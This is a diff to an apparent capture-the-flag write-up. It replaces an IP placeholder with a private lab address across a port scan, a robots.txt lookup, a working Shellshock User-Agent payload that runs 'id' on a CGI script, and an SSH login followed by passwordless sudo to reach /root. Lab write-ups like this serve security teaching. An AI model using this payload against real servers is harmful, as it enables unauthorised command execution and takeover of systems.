@@ -7,7 +7,7 @@
 Since the challenge is not showing a port, we first do a port scan using nmap.
 
 ```bash
-$ nmap -p- $IP
+$ nmap -p- 192.168.10.8
 
 Nmap scan report for 192.168.10.8
 Host is up (0.073s latency).
@@ -89,7 +89,7 @@ The `robots.txt` shows a hint that this machine is vulnerable and contains a lin
 
 
 ```bash
-$ curl http://$IP:$PORT/robots.txt -u $AUTH                    
+$ curl http://192.168.10.8:$PORT/robots.txt -u $AUTH                    
 
 /cgi-bin/vulnerable
 
@@ -100,7 +100,7 @@ Using the shellshock exploit and `id` as the command, the vulnerability can be d
 
 
 ```bash
-$ curl -A "() { :;}; echo; /bin/bash -c 'id'" http://$IP:$PORT/cgi-bin/vulnerable -u $AUTH
+$ curl -A "() { :;}; echo; /bin/bash -c 'id'" http://192.168.10.8:$PORT/cgi-bin/vulnerable -u $AUTH
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -164,7 +164,7 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9
 
 Since the user is in the sudo group and is not requesting a password, the flag can be retrieved from the `/root/` folder.
 ```bash
-$ ssh -i key joaquim@$IP
+$ ssh -i key joaquim@192.168.10.8
 
 
 $ sudo ls -lah /root
